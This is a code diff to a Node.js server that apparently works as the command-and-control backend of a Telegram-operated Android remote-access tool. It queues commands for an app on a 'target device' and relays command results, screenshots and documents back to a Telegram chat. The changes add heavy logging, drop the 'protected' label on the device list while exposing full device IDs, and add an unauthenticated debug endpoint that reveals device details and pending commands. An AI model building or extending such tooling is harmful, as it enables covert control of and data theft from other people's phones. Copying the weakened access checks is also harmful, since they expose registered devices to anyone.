@@ -61,6 +61,7 @@ app.get('/api/commands/:deviceId', (req, res) => {
         const commands = [...device.pendingCommands];
         device.pendingCommands = []; // Clear after sending
         console.log(`📤 Sending ${commands.length} command(s) to device ${deviceId}`);
+        console.log('📤 Commands:', JSON.stringify(commands, null, 2));
         res.json({ commands });
     } else {
         res.json({ commands: [] });
@@ -82,6 +83,7 @@ app.post('/api/result/:deviceId', async (req, res) => {
             : `✅ *Command Executed*\n\n${command}\n\nResult:\n${result}`;
         
         await sendTelegramMessage(chatId, message);
+        console.log(`📨 Result sent to Telegram chat ${chatId}`);
     }
     
     res.sendStatus(200);
@@ -92,6 +94,15 @@ app.post('/api/register', async (req, res) => {
     const { deviceId, chatId, deviceInfo } = req.body;
     
     console.log('📝 Registration attempt:', { deviceId, chatId, deviceInfo });
+    
+    // Validate required fields
+    if (!deviceId || !chatId || !deviceInfo) {
+        console.log('❌ Missing required fields');
+        return res.status(400).json({ 
+            status: 'error', 
+            message: 'Missing required fields. Need deviceId, chatId, and deviceInfo' 
+        });
+    }
     
     // Verify the chatId is authorized
     if (!isAuthorizedChat(chatId)) {
@@ -112,17 +123,19 @@ app.post('/api/register', async (req, res) => {
         pendingCommands: []
     });
     
-    console.log(`✅ Device registered: ${deviceId} for authorized chat ${chatId}`);
-    console.log('📱 Device info:', deviceInfo);
-    console.log(`📊 Total devices now: ${devices.size}`);
+    console.log(`✅ Device registered successfully!`);
+    console.log(`   - Device ID: ${deviceId}`);
+    console.log(`   - Chat ID: ${chatId}`);
+    console.log(`   - Device Info:`, deviceInfo);
+    console.log(`   - Total devices now: ${devices.size}`);
     
     // Send confirmation to Telegram
     await sendTelegramMessage(chatId, 
         `✅ *Device Connected Successfully!*\n\n` +
         `📱 *Device Details:*\n` +
-        `Model: ${deviceInfo.model}\n` +
-        `Android: ${deviceInfo.android}\n` +
-        `Battery: ${deviceInfo.battery}\n` +
+        `Model: ${deviceInfo.model || 'Unknown'}\n` +
+        `Android: ${deviceInfo.android || 'Unknown'}\n` +
+        `Battery: ${deviceInfo.battery || 'Unknown'}\n` +
         `ID: ${deviceId.substring(0, 8)}...\n\n` +
         `🎯 *Available Commands:*\n` +
         `/status - Get device status\n` +
@@ -134,21 +147,45 @@ app.post('/api/register', async (req, res) => {
     res.json({ status: 'registered', deviceId: deviceId });
 });
 
-// Endpoint to list all registered devices (protected)
+// Endpoint to list all registered devices
 app.get('/api/devices', (req, res) => {
     const deviceList = [];
     for (const [id, device] of devices.entries()) {
         deviceList.push({
-            deviceId: id.substring(0, 8) + '...',
+            deviceId: id,
             chatId: device.chatId,
             lastSeen: new Date(device.lastSeen).toISOString(),
-            model: device.deviceInfo?.model || 'Unknown'
+            model: device.deviceInfo?.model || 'Unknown',
+            android: device.deviceInfo?.android || 'Unknown'
         });
     }
     res.json({ 
         total: devices.size,
         devices: deviceList 
     });
+});
+
+// Debug endpoint to check a specific device
+app.get('/api/debug/:deviceId', (req, res) => {
+    const deviceId = req.params.deviceId;
+    const device = devices.get(deviceId);
+    
+    if (device) {
+        res.json({
+            deviceId: deviceId,
+            chatId: device.chatId,
+            deviceInfo: device.deviceInfo,
+            lastSeen: new Date(device.lastSeen).toISOString(),
+            pendingCommands: device.pendingCommands || [],
+            pendingCount: device.pendingCommands?.length || 0
+        });
+    } else {
+        res.json({ 
+            error: 'Device not found',
+            deviceId: deviceId,
+            registeredDevices: Array.from(devices.keys())
+        });
+    }
 });
 
 // Test endpoint
@@ -159,9 +196,11 @@ app.post('/api/test/:deviceId', (req, res) => {
     if (device) {
         console.log(`🔔 Test ping received for device ${deviceId}`);
         device.lastSeen = Date.now();
+        res.json({ status: 'ok', deviceFound: true });
+    } else {
+        console.log(`🔔 Test ping received for unknown device ${deviceId}`);
+        res.json({ status: 'ok', deviceFound: false });
     }
-    
-    res.json({ status: 'ok' });
 });
 
 // Health check endpoint
@@ -177,31 +216,47 @@ app.get('/health', (req, res) => {
 // Command handler
 async function handleCommand(chatId, command, messageId) {
     console.log(`🎯 Handling command ${command} from authorized chat ${chatId}`);
+    console.log(`📊 Current devices in memory: ${devices.size}`);
+    
+    // Log all registered devices for debugging
+    if (devices.size > 0) {
+        console.log('Registered devices:');
+        for (const [id, device] of devices.entries()) {
+            console.log(`   - Device ${id} -> Chat ${device.chatId}`);
+        }
+    } else {
+        console.log('⚠️ No devices registered');
+    }
 
     // Find device for this chat
     let deviceId = null;
     let device = null;
     
     for (const [id, d] of devices.entries()) {
-        if (d.chatId === chatId) {
+        console.log(`Checking device ${id} with chat ${d.chatId} against ${chatId}`);
+        if (String(d.chatId) === String(chatId)) {
             deviceId = id;
             device = d;
+            console.log(`✅ Found matching device: ${id}`);
             break;
         }
     }
 
     if (!deviceId) {
+        console.log(`❌ No device found for chat ${chatId}`);
+        console.log('Current registered chats:', Array.from(devices.values()).map(d => d.chatId).join(', '));
         await sendTelegramMessage(chatId, 
             '❌ No device registered for this chat.\n\n' +
-            'Please make sure the Android app is running on your target device.');
+            'Please make sure the Android app is running on your target device.\n' +
+            'Current registered chats: ' + (Array.from(devices.values()).map(d => d.chatId).join(', ') || 'none'));
         return;
     }
 
     // Update last seen
     device.lastSeen = Date.now();
 
-    // Handle special commands
-    if (command === '/help') {
+    // Handle help command directly (doesn't need device)
+    if (command === '/help' || command === '/start') {
         await sendTelegramMessage(chatId,
             '📋 *Available Commands*\n\n' +
             '*/status* - Get device status\n' +
@@ -212,33 +267,40 @@ async function handleCommand(chatId, command, messageId) {
         return;
     }
 
-    // Add command to device's pending queue
+    // For all other commands, add to device's pending queue
     if (!device.pendingCommands) {
         device.pendingCommands = [];
     }
     
-    device.pendingCommands.push({
-        command,
-        messageId,
+    // IMPORTANT: Add the command to the queue
+    const commandObject = {
+        command: command,
+        messageId: messageId,
         timestamp: Date.now()
-    });
+    };
+    
+    device.pendingCommands.push(commandObject);
+    console.log(`📝 Command added to queue for device ${deviceId}:`, commandObject);
+    console.log(`📊 Pending commands now: ${device.pendingCommands.length}`);
 
     // Acknowledge command receipt
     await sendTelegramMessage(chatId, `⏳ Processing: ${command}`);
-    console.log(`📝 Command added to queue for device ${deviceId}`);
 }
 
 // Helper to send Telegram messages
 async function sendTelegramMessage(chatId, text) {
     try {
+        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
         const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
             chat_id: chatId,
             text: text,
             parse_mode: 'Markdown'
         });
         console.log(`📨 Message sent to ${chatId}:`, response.data.ok);
+        return response.data;
     } catch (error) {
         console.error('❌ Error sending message:', error.response?.data || error.message);
+        throw error;
     }
 }
 
@@ -250,11 +312,14 @@ async function sendTelegramPhoto(chatId, photoBuffer, caption) {
         formData.append('photo', photoBuffer, 'screenshot.jpg');
         formData.append('caption', caption);
         
-        await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
+        const response = await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
             headers: { 'Content-Type': 'multipart/form-data' }
         });
+        console.log(`📸 Photo sent to ${chatId}`);
+        return response.data;
     } catch (error) {
         console.error('❌ Error sending photo:', error.response?.data || error.message);
+        throw error;
     }
 }
 
@@ -266,11 +331,14 @@ async function sendTelegramDocument(chatId, documentBuffer, filename, caption) {
         formData.append('document', documentBuffer, filename);
         formData.append('caption', caption);
         
-        await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
+        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
             headers: { 'Content-Type': 'multipart/form-data' }
         });
+        console.log(`📎 Document sent to ${chatId}`);
+        return response.data;
     } catch (error) {
         console.error('❌ Error sending document:', error.response?.data || error.message);
+        throw error;
     }
 }
 
